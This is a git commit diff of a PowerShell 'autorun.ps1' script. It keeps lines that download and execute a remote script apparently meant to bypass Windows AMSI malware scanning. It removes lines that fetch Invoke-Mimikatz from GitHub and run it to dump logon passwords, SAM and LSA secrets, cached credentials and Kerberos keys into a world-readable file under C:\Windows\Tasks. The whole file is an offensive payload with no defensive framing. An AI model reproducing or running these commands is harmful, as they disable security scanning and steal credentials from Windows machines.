5eead1545e55d46fde7e30590ad648dcdc296165
borari <33162660+borari@users.noreply.github.com>
2024-10-09 01:16:11 -0400

    Update autorun.ps1

--- autorun.ps1
+++ autorun.ps1
@@ -1,6 +1,4 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12;
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ShorSec/AMS-BP/master/AMSBP.ps1');
 amsbp;
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1');
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"' >> C:\Windows\Tasks\mraow.txt;
-echo Y| icacls c:\windows\tasks\mraow.txt /grant Everyone:F;
+
